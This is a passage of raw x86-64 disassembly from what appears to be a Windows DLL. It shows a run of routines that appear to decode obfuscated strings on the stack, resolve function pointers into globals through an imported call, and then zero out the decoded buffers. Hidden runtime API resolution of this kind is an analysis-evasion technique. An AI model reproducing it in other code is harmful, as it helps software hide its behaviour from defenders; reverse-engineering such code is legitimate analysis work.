   18000260d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002611:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002615:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   18000261a:	88 45 a4             	mov    %al,-0x5c(%rbp)
   18000261d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002621:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002625:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   18000262a:	88 45 a5             	mov    %al,-0x5b(%rbp)
   18000262d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002631:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002635:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   18000263a:	88 45 a6             	mov    %al,-0x5a(%rbp)
   18000263d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002641:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002645:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   18000264a:	88 45 a7             	mov    %al,-0x59(%rbp)
   18000264d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002651:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002655:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   18000265a:	88 45 a8             	mov    %al,-0x58(%rbp)
   18000265d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002661:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002665:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   18000266a:	88 45 a9             	mov    %al,-0x57(%rbp)
   18000266d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002671:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002675:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   18000267a:	88 45 aa             	mov    %al,-0x56(%rbp)
   18000267d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002681:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002685:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   18000268a:	88 45 ab             	mov    %al,-0x55(%rbp)
   18000268d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002691:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002695:	66 0f 73 d8 0d       	psrldq $0xd,%xmm0
   18000269a:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   18000269f:	88 45 ac             	mov    %al,-0x54(%rbp)
   1800026a2:	66 0f 7e c0          	movd   %xmm0,%eax
   1800026a6:	88 45 ad             	mov    %al,-0x53(%rbp)
   1800026a9:	66 0f 7e c8          	movd   %xmm1,%eax
   1800026ad:	88 45 ae             	mov    %al,-0x52(%rbp)
   1800026b0:	e8 bb bd 00 00       	call   0x18000e470
   1800026b5:	48 8b d0             	mov    %rax,%rdx
   1800026b8:	49 8b ce             	mov    %r14,%rcx
   1800026bb:	ff 15 6f 3a 02 00    	call   *0x23a6f(%rip)        # 0x180026130
   1800026c1:	48 89 05 c0 85 3a 00 	mov    %rax,0x3a85c0(%rip)        # 0x1803aac88
   1800026c8:	48 85 c0             	test   %rax,%rax
   1800026cb:	0f 84 b5 05 00 00    	je     0x180002c86
   1800026d1:	66 0f 6f 0d 47 26 3a 	movdqa 0x3a2647(%rip),%xmm1        # 0x1803a4d20
   1800026d8:	00 
   1800026d9:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800026dd:	33 c0                	xor    %eax,%eax
   1800026df:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800026e3:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1800026e8:	0f ba eb 16          	bts    $0x16,%ebx
   1800026ec:	48 89 45 8e          	mov    %rax,-0x72(%rbp)
   1800026f0:	89 45 96             	mov    %eax,-0x6a(%rbp)
   1800026f3:	66 89 45 9a          	mov    %ax,-0x66(%rbp)
   1800026f7:	66 0f 7e c8          	movd   %xmm1,%eax
   1800026fb:	88 45 80             	mov    %al,-0x80(%rbp)
   1800026fe:	66 0f 7e c0          	movd   %xmm0,%eax
   180002702:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002706:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   18000270b:	88 45 81             	mov    %al,-0x7f(%rbp)
   18000270e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002712:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002716:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   18000271b:	88 45 82             	mov    %al,-0x7e(%rbp)
   18000271e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002722:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002726:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   18000272b:	88 45 83             	mov    %al,-0x7d(%rbp)
   18000272e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002732:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002736:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   18000273b:	88 45 84             	mov    %al,-0x7c(%rbp)
   18000273e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002742:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002746:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   18000274b:	88 45 85             	mov    %al,-0x7b(%rbp)
   18000274e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002752:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002756:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   18000275b:	88 45 86             	mov    %al,-0x7a(%rbp)
   18000275e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002762:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002766:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   18000276b:	88 45 87             	mov    %al,-0x79(%rbp)
   18000276e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002772:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002776:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   18000277b:	88 45 88             	mov    %al,-0x78(%rbp)
   18000277e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002782:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002786:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   18000278b:	88 45 89             	mov    %al,-0x77(%rbp)
   18000278e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002792:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002796:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   18000279b:	88 45 8a             	mov    %al,-0x76(%rbp)
   18000279e:	66 0f 7e c0          	movd   %xmm0,%eax
   1800027a2:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800027a6:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   1800027ab:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   1800027b0:	88 45 8b             	mov    %al,-0x75(%rbp)
   1800027b3:	66 0f 7e c0          	movd   %xmm0,%eax
   1800027b7:	88 45 8c             	mov    %al,-0x74(%rbp)
   1800027ba:	66 0f 7e c8          	movd   %xmm1,%eax
   1800027be:	88 45 8d             	mov    %al,-0x73(%rbp)
   1800027c1:	e8 fa bd 00 00       	call   0x18000e5c0
   1800027c6:	48 8b d0             	mov    %rax,%rdx
   1800027c9:	49 8b ce             	mov    %r14,%rcx
   1800027cc:	ff 15 5e 39 02 00    	call   *0x2395e(%rip)        # 0x180026130
   1800027d2:	48 89 05 f7 84 3a 00 	mov    %rax,0x3a84f7(%rip)        # 0x1803aacd0
   1800027d9:	48 85 c0             	test   %rax,%rax
   1800027dc:	0f 84 a4 04 00 00    	je     0x180002c86
   1800027e2:	66 0f 6f 0d 56 27 3a 	movdqa 0x3a2756(%rip),%xmm1        # 0x1803a4f40
   1800027e9:	00 
   1800027ea:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1800027ee:	33 c0                	xor    %eax,%eax
   1800027f0:	c6 45 28 33          	movb   $0x33,0x28(%rbp)
   1800027f4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800027f7:	89 45 01             	mov    %eax,0x1(%rbp)
   1800027fa:	66 89 45 05          	mov    %ax,0x5(%rbp)
   1800027fe:	0f ba eb 17          	bts    $0x17,%ebx
   180002802:	88 45 07             	mov    %al,0x7(%rbp)
   180002805:	0f 11 45 29          	movups %xmm0,0x29(%rbp)
   180002809:	88 45 39             	mov    %al,0x39(%rbp)
   18000280c:	0f 11 4d 18          	movups %xmm1,0x18(%rbp)
   180002810:	e8 7b bd 00 00       	call   0x18000e590
   180002815:	48 8b d0             	mov    %rax,%rdx
   180002818:	49 8b ce             	mov    %r14,%rcx
   18000281b:	ff 15 0f 39 02 00    	call   *0x2390f(%rip)        # 0x180026130
   180002821:	48 89 05 70 84 3a 00 	mov    %rax,0x3a8470(%rip)        # 0x1803aac98
   180002828:	48 85 c0             	test   %rax,%rax
   18000282b:	0f 84 55 04 00 00    	je     0x180002c86
   180002831:	66 0f 6f 0d 17 27 3a 	movdqa 0x3a2717(%rip),%xmm1        # 0x1803a4f50
   180002838:	00 
   180002839:	48 8d 8d f8 00 00 00 	lea    0xf8(%rbp),%rcx
   180002840:	33 c0                	xor    %eax,%eax
   180002842:	c6 85 08 01 00 00 33 	movb   $0x33,0x108(%rbp)
   180002849:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000284c:	89 45 01             	mov    %eax,0x1(%rbp)
   18000284f:	66 89 45 05          	mov    %ax,0x5(%rbp)
   180002853:	0f ba eb 18          	bts    $0x18,%ebx
   180002857:	88 45 07             	mov    %al,0x7(%rbp)
   18000285a:	0f 11 85 09 01 00 00 	movups %xmm0,0x109(%rbp)
   180002861:	88 85 19 01 00 00    	mov    %al,0x119(%rbp)
   180002867:	0f 11 8d f8 00 00 00 	movups %xmm1,0xf8(%rbp)
   18000286e:	e8 1d bd 00 00       	call   0x18000e590
   180002873:	48 8b d0             	mov    %rax,%rdx
   180002876:	49 8b ce             	mov    %r14,%rcx
   180002879:	ff 15 b1 38 02 00    	call   *0x238b1(%rip)        # 0x180026130
   18000287f:	48 89 05 1a 84 3a 00 	mov    %rax,0x3a841a(%rip)        # 0x1803aaca0
   180002886:	48 85 c0             	test   %rax,%rax
   180002889:	0f 84 f7 03 00 00    	je     0x180002c86
   18000288f:	66 0f 6f 0d 59 24 3a 	movdqa 0x3a2459(%rip),%xmm1        # 0x1803a4cf0
   180002896:	00 
   180002897:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   18000289c:	33 c0                	xor    %eax,%eax
   18000289e:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800028a2:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1800028a7:	0f ba eb 19          	bts    $0x19,%ebx
   1800028ab:	48 89 44 24 6e       	mov    %rax,0x6e(%rsp)
   1800028b0:	89 44 24 76          	mov    %eax,0x76(%rsp)
   1800028b4:	66 89 44 24 7a       	mov    %ax,0x7a(%rsp)
   1800028b9:	66 0f 7e c8          	movd   %xmm1,%eax
   1800028bd:	88 44 24 60          	mov    %al,0x60(%rsp)
   1800028c1:	66 0f 7e c0          	movd   %xmm0,%eax
   1800028c5:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800028c9:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   1800028ce:	88 44 24 61          	mov    %al,0x61(%rsp)
   1800028d2:	66 0f 7e c0          	movd   %xmm0,%eax
   1800028d6:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800028da:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   1800028df:	88 44 24 62          	mov    %al,0x62(%rsp)
   1800028e3:	66 0f 7e c0          	movd   %xmm0,%eax
   1800028e7:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800028eb:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   1800028f0:	88 44 24 63          	mov    %al,0x63(%rsp)
   1800028f4:	66 0f 7e c0          	movd   %xmm0,%eax
   1800028f8:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800028fc:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180002901:	88 44 24 64          	mov    %al,0x64(%rsp)
   180002905:	66 0f 7e c0          	movd   %xmm0,%eax
   180002909:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000290d:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180002912:	88 44 24 65          	mov    %al,0x65(%rsp)
   180002916:	66 0f 7e c0          	movd   %xmm0,%eax
   18000291a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000291e:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180002923:	88 44 24 66          	mov    %al,0x66(%rsp)
   180002927:	66 0f 7e c0          	movd   %xmm0,%eax
   18000292b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000292f:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180002934:	88 44 24 67          	mov    %al,0x67(%rsp)
   180002938:	66 0f 7e c0          	movd   %xmm0,%eax
   18000293c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002940:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180002945:	88 44 24 68          	mov    %al,0x68(%rsp)
   180002949:	66 0f 7e c0          	movd   %xmm0,%eax
   18000294d:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002951:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180002956:	88 44 24 69          	mov    %al,0x69(%rsp)
   18000295a:	66 0f 7e c0          	movd   %xmm0,%eax
   18000295e:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002962:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180002967:	88 44 24 6a          	mov    %al,0x6a(%rsp)
   18000296b:	66 0f 7e c0          	movd   %xmm0,%eax
   18000296f:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002973:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   180002978:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   18000297d:	88 44 24 6b          	mov    %al,0x6b(%rsp)
   180002981:	66 0f 7e c0          	movd   %xmm0,%eax
   180002985:	88 44 24 6c          	mov    %al,0x6c(%rsp)
   180002989:	66 0f 7e c8          	movd   %xmm1,%eax
   18000298d:	88 44 24 6d          	mov    %al,0x6d(%rsp)
   180002991:	e8 2a bc 00 00       	call   0x18000e5c0
   180002996:	48 8b d0             	mov    %rax,%rdx
   180002999:	49 8b ce             	mov    %r14,%rcx
   18000299c:	ff 15 8e 37 02 00    	call   *0x2378e(%rip)        # 0x180026130
   1800029a2:	48 89 05 8f 82 3a 00 	mov    %rax,0x3a828f(%rip)        # 0x1803aac38
   1800029a9:	48 85 c0             	test   %rax,%rax
   1800029ac:	0f 84 d4 02 00 00    	je     0x180002c86
   1800029b2:	66 0f 6f 0d 06 27 3a 	movdqa 0x3a2706(%rip),%xmm1        # 0x1803a50c0
   1800029b9:	00 
   1800029ba:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1800029be:	33 c0                	xor    %eax,%eax
   1800029c0:	66 c7 45 00 47 34    	movw   $0x3447,0x0(%rbp)
   1800029c6:	89 45 02             	mov    %eax,0x2(%rbp)
   1800029c9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800029cc:	66 89 45 06          	mov    %ax,0x6(%rbp)
   1800029d0:	0f ba eb 1a          	bts    $0x1a,%ebx
   1800029d4:	66 89 45 e2          	mov    %ax,-0x1e(%rbp)
   1800029d8:	0f b7 45 00          	movzwl 0x0(%rbp),%eax
   1800029dc:	66 89 45 d0          	mov    %ax,-0x30(%rbp)
   1800029e0:	0f 11 45 d2          	movups %xmm0,-0x2e(%rbp)
   1800029e4:	0f 11 4d c0          	movups %xmm1,-0x40(%rbp)
   1800029e8:	e8 53 bc 00 00       	call   0x18000e640
   1800029ed:	48 8b d0             	mov    %rax,%rdx
   1800029f0:	49 8b ce             	mov    %r14,%rcx
   1800029f3:	ff 15 37 37 02 00    	call   *0x23737(%rip)        # 0x180026130
   1800029f9:	48 89 05 f8 82 3a 00 	mov    %rax,0x3a82f8(%rip)        # 0x1803aacf8
   180002a00:	48 85 c0             	test   %rax,%rax
   180002a03:	0f 84 7d 02 00 00    	je     0x180002c86
   180002a09:	66 0f 6f 0d 1f 22 3a 	movdqa 0x3a221f(%rip),%xmm1        # 0x1803a4c30
   180002a10:	00 
   180002a11:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002a16:	33 c0                	xor    %eax,%eax
   180002a18:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002a1c:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180002a21:	0f ba eb 1b          	bts    $0x1b,%ebx
   180002a25:	48 89 44 24 2d       	mov    %rax,0x2d(%rsp)
   180002a2a:	89 44 24 35          	mov    %eax,0x35(%rsp)
   180002a2e:	88 44 24 39          	mov    %al,0x39(%rsp)
   180002a32:	66 0f 7e c8          	movd   %xmm1,%eax
   180002a36:	88 44 24 20          	mov    %al,0x20(%rsp)
   180002a3a:	66 0f 7e c0          	movd   %xmm0,%eax
   180002a3e:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002a42:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180002a47:	88 44 24 21          	mov    %al,0x21(%rsp)
   180002a4b:	66 0f 7e c0          	movd   %xmm0,%eax
   180002a4f:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002a53:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180002a58:	88 44 24 22          	mov    %al,0x22(%rsp)
   180002a5c:	66 0f 7e c0          	movd   %xmm0,%eax
   180002a60:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002a64:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180002a69:	88 44 24 23          	mov    %al,0x23(%rsp)
   180002a6d:	66 0f 7e c0          	movd   %xmm0,%eax
   180002a71:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002a75:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180002a7a:	88 44 24 24          	mov    %al,0x24(%rsp)
   180002a7e:	66 0f 7e c0          	movd   %xmm0,%eax
   180002a82:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002a86:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180002a8b:	88 44 24 25          	mov    %al,0x25(%rsp)
   180002a8f:	66 0f 7e c0          	movd   %xmm0,%eax
   180002a93:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002a97:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180002a9c:	88 44 24 26          	mov    %al,0x26(%rsp)
   180002aa0:	66 0f 7e c0          	movd   %xmm0,%eax
   180002aa4:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002aa8:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180002aad:	88 44 24 27          	mov    %al,0x27(%rsp)
   180002ab1:	66 0f 7e c0          	movd   %xmm0,%eax
   180002ab5:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002ab9:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180002abe:	88 44 24 28          	mov    %al,0x28(%rsp)
   180002ac2:	66 0f 7e c0          	movd   %xmm0,%eax
   180002ac6:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002aca:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180002acf:	88 44 24 29          	mov    %al,0x29(%rsp)
   180002ad3:	66 0f 7e c0          	movd   %xmm0,%eax
   180002ad7:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002adb:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180002ae0:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   180002ae5:	88 44 24 2a          	mov    %al,0x2a(%rsp)
   180002ae9:	66 0f 7e c0          	movd   %xmm0,%eax
   180002aed:	88 44 24 2b          	mov    %al,0x2b(%rsp)
   180002af1:	66 0f 7e c8          	movd   %xmm1,%eax
   180002af5:	88 44 24 2c          	mov    %al,0x2c(%rsp)
   180002af9:	e8 12 b8 00 00       	call   0x18000e310
   180002afe:	48 8b d0             	mov    %rax,%rdx
   180002b01:	49 8b ce             	mov    %r14,%rcx
   180002b04:	ff 15 26 36 02 00    	call   *0x23626(%rip)        # 0x180026130
   180002b0a:	48 89 05 47 81 3a 00 	mov    %rax,0x3a8147(%rip)        # 0x1803aac58
   180002b11:	48 85 c0             	test   %rax,%rax
   180002b14:	0f 84 6c 01 00 00    	je     0x180002c86
   180002b1a:	66 0f 6f 0d 9e 23 3a 	movdqa 0x3a239e(%rip),%xmm1        # 0x1803a4ec0
   180002b21:	00 
   180002b22:	48 8d 8d 98 00 00 00 	lea    0x98(%rbp),%rcx
   180002b29:	33 c0                	xor    %eax,%eax
   180002b2b:	c6 85 a8 00 00 00 33 	movb   $0x33,0xa8(%rbp)
   180002b32:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002b35:	89 45 01             	mov    %eax,0x1(%rbp)
   180002b38:	66 89 45 05          	mov    %ax,0x5(%rbp)
   180002b3c:	0f ba eb 1c          	bts    $0x1c,%ebx
   180002b40:	88 45 07             	mov    %al,0x7(%rbp)
   180002b43:	0f 11 85 a9 00 00 00 	movups %xmm0,0xa9(%rbp)
   180002b4a:	88 85 b9 00 00 00    	mov    %al,0xb9(%rbp)
   180002b50:	0f 11 8d 98 00 00 00 	movups %xmm1,0x98(%rbp)
   180002b57:	e8 34 ba 00 00       	call   0x18000e590
   180002b5c:	48 8b d0             	mov    %rax,%rdx
   180002b5f:	49 8b ce             	mov    %r14,%rcx
   180002b62:	ff 15 c8 35 02 00    	call   *0x235c8(%rip)        # 0x180026130
   180002b68:	48 89 05 79 81 3a 00 	mov    %rax,0x3a8179(%rip)        # 0x1803aace8
   180002b6f:	48 85 c0             	test   %rax,%rax
   180002b72:	0f 84 0e 01 00 00    	je     0x180002c86
   180002b78:	66 0f 6f 15 50 20 3a 	movdqa 0x3a2050(%rip),%xmm2        # 0x1803a4bd0
   180002b7f:	00 
   180002b80:	48 8d 8d 28 01 00 00 	lea    0x128(%rbp),%rcx
   180002b87:	66 0f 6f 0d 91 23 3a 	movdqa 0x3a2391(%rip),%xmm1        # 0x1803a4f20
   180002b8e:	00 
   180002b8f:	33 c0                	xor    %eax,%eax
   180002b91:	f2 0f 11 95 38 01 00 	movsd  %xmm2,0x138(%rbp)
   180002b98:	00 
   180002b99:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002b9c:	66 0f 73 da 08       	psrldq $0x8,%xmm2
   180002ba1:	0f ba eb 1d          	bts    $0x1d,%ebx
   180002ba5:	66 0f 7e 95 40 01 00 	movd   %xmm2,0x140(%rbp)
   180002bac:	00 
   180002bad:	0f 11 85 44 01 00 00 	movups %xmm0,0x144(%rbp)
   180002bb4:	48 89 85 54 01 00 00 	mov    %rax,0x154(%rbp)
   180002bbb:	89 85 5c 01 00 00    	mov    %eax,0x15c(%rbp)
   180002bc1:	0f 11 8d 28 01 00 00 	movups %xmm1,0x128(%rbp)
   180002bc8:	e8 c3 ba 00 00       	call   0x18000e690
   180002bcd:	48 8b d0             	mov    %rax,%rdx
   180002bd0:	49 8b ce             	mov    %r14,%rcx
   180002bd3:	ff 15 57 35 02 00    	call   *0x23557(%rip)        # 0x180026130
   180002bd9:	48 89 05 48 80 3a 00 	mov    %rax,0x3a8048(%rip)        # 0x1803aac28
   180002be0:	48 85 c0             	test   %rax,%rax
   180002be3:	0f 84 9d 00 00 00    	je     0x180002c86
   180002be9:	66 0f 6f 15 df 21 3a 	movdqa 0x3a21df(%rip),%xmm2        # 0x1803a4dd0
   180002bf0:	00 
   180002bf1:	48 8d 8d 68 01 00 00 	lea    0x168(%rbp),%rcx
   180002bf8:	66 0f 6f 0d 80 23 3a 	movdqa 0x3a2380(%rip),%xmm1        # 0x1803a4f80
   180002bff:	00 
   180002c00:	33 c0                	xor    %eax,%eax
   180002c02:	48 89 85 97 01 00 00 	mov    %rax,0x197(%rbp)
   180002c09:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002c0c:	89 85 9f 01 00 00    	mov    %eax,0x19f(%rbp)
   180002c12:	0f ba eb 1e          	bts    $0x1e,%ebx
   180002c16:	66 89 85 a3 01 00 00 	mov    %ax,0x1a3(%rbp)
   180002c1d:	88 85 a5 01 00 00    	mov    %al,0x1a5(%rbp)
   180002c23:	66 0f c5 c2 06       	pextrw $0x6,%xmm2,%eax
   180002c28:	0f 11 8d 68 01 00 00 	movups %xmm1,0x168(%rbp)
   180002c2f:	f2 0f 11 95 78 01 00 	movsd  %xmm2,0x178(%rbp)
   180002c36:	00 
   180002c37:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   180002c3b:	66 89 85 84 01 00 00 	mov    %ax,0x184(%rbp)
   180002c42:	66 0f 73 da 0e       	psrldq $0xe,%xmm2
   180002c47:	66 0f 7e d0          	movd   %xmm2,%eax
   180002c4b:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   180002c50:	0f 11 85 87 01 00 00 	movups %xmm0,0x187(%rbp)
   180002c57:	88 85 86 01 00 00    	mov    %al,0x186(%rbp)
   180002c5d:	66 0f 7e 8d 80 01 00 	movd   %xmm1,0x180(%rbp)
   180002c64:	00 
   180002c65:	e8 46 b6 00 00       	call   0x18000e2b0
   180002c6a:	48 8b d0             	mov    %rax,%rdx
   180002c6d:	49 8b ce             	mov    %r14,%rcx
   180002c70:	ff 15 ba 34 02 00    	call   *0x234ba(%rip)        # 0x180026130
   180002c76:	48 89 05 13 80 3a 00 	mov    %rax,0x3a8013(%rip)        # 0x1803aac90
   180002c7d:	48 85 c0             	test   %rax,%rax
   180002c80:	74 04                	je     0x180002c86
   180002c82:	32 c9                	xor    %cl,%cl
   180002c84:	eb 02                	jmp    0x180002c88
   180002c86:	b1 01                	mov    $0x1,%cl
   180002c88:	0f ba e3 1e          	bt     $0x1e,%ebx
   180002c8c:	73 23                	jae    0x180002cb1
   180002c8e:	0f ba f3 1e          	btr    $0x1e,%ebx
   180002c92:	48 8b c6             	mov    %rsi,%rax
   180002c95:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180002c9c:	00 00 00 00 
   180002ca0:	40 88 b4 05 87 01 00 	mov    %sil,0x187(%rbp,%rax,1)
   180002ca7:	00 
   180002ca8:	48 ff c0             	inc    %rax
   180002cab:	48 83 f8 1f          	cmp    $0x1f,%rax
   180002caf:	72 ef                	jb     0x180002ca0
   180002cb1:	0f ba e3 1d          	bt     $0x1d,%ebx
   180002cb5:	73 1a                	jae    0x180002cd1
   180002cb7:	0f ba f3 1d          	btr    $0x1d,%ebx
   180002cbb:	48 8b c6             	mov    %rsi,%rax
   180002cbe:	66 90                	xchg   %ax,%ax
   180002cc0:	40 88 b4 05 44 01 00 	mov    %sil,0x144(%rbp,%rax,1)
   180002cc7:	00 
   180002cc8:	48 ff c0             	inc    %rax
   180002ccb:	48 83 f8 1c          	cmp    $0x1c,%rax
   180002ccf:	72 ef                	jb     0x180002cc0
   180002cd1:	0f ba e3 1c          	bt     $0x1c,%ebx
   180002cd5:	73 1a                	jae    0x180002cf1
   180002cd7:	0f ba f3 1c          	btr    $0x1c,%ebx
   180002cdb:	48 8b c6             	mov    %rsi,%rax
   180002cde:	66 90                	xchg   %ax,%ax
   180002ce0:	40 88 b4 05 a9 00 00 	mov    %sil,0xa9(%rbp,%rax,1)
   180002ce7:	00 
   180002ce8:	48 ff c0             	inc    %rax
   180002ceb:	48 83 f8 11          	cmp    $0x11,%rax
   180002cef:	72 ef                	jb     0x180002ce0
   180002cf1:	0f ba e3 1b          	bt     $0x1b,%ebx
   180002cf5:	73 17                	jae    0x180002d0e
   180002cf7:	0f ba f3 1b          	btr    $0x1b,%ebx
   180002cfb:	48 8b c6             	mov    %rsi,%rax
   180002cfe:	66 90                	xchg   %ax,%ax
   180002d00:	40 88 74 04 2d       	mov    %sil,0x2d(%rsp,%rax,1)
   180002d05:	48 ff c0             	inc    %rax
   180002d08:	48 83 f8 0d          	cmp    $0xd,%rax
   180002d0c:	72 f2                	jb     0x180002d00
   180002d0e:	0f ba e3 1a          	bt     $0x1a,%ebx
   180002d12:	73 1a                	jae    0x180002d2e
   180002d14:	0f ba f3 1a          	btr    $0x1a,%ebx
   180002d18:	48 8b c6             	mov    %rsi,%rax
   180002d1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002d20:	40 88 74 05 d2       	mov    %sil,-0x2e(%rbp,%rax,1)
   180002d25:	48 ff c0             	inc    %rax
   180002d28:	48 83 f8 12          	cmp    $0x12,%rax
   180002d2c:	72 f2                	jb     0x180002d20
   180002d2e:	0f ba e3 19          	bt     $0x19,%ebx
   180002d32:	73 1a                	jae    0x180002d4e
   180002d34:	0f ba f3 19          	btr    $0x19,%ebx
   180002d38:	48 8b c6             	mov    %rsi,%rax
   180002d3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002d40:	40 88 74 04 6e       	mov    %sil,0x6e(%rsp,%rax,1)
   180002d45:	48 ff c0             	inc    %rax
   180002d48:	48 83 f8 0e          	cmp    $0xe,%rax
   180002d4c:	72 f2                	jb     0x180002d40
   180002d4e:	0f ba e3 18          	bt     $0x18,%ebx
   180002d52:	73 1d                	jae    0x180002d71
   180002d54:	0f ba f3 18          	btr    $0x18,%ebx
   180002d58:	48 8b c6             	mov    %rsi,%rax
   180002d5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002d60:	40 88 b4 05 09 01 00 	mov    %sil,0x109(%rbp,%rax,1)
   180002d67:	00 
   180002d68:	48 ff c0             	inc    %rax
   180002d6b:	48 83 f8 11          	cmp    $0x11,%rax
   180002d6f:	72 ef                	jb     0x180002d60
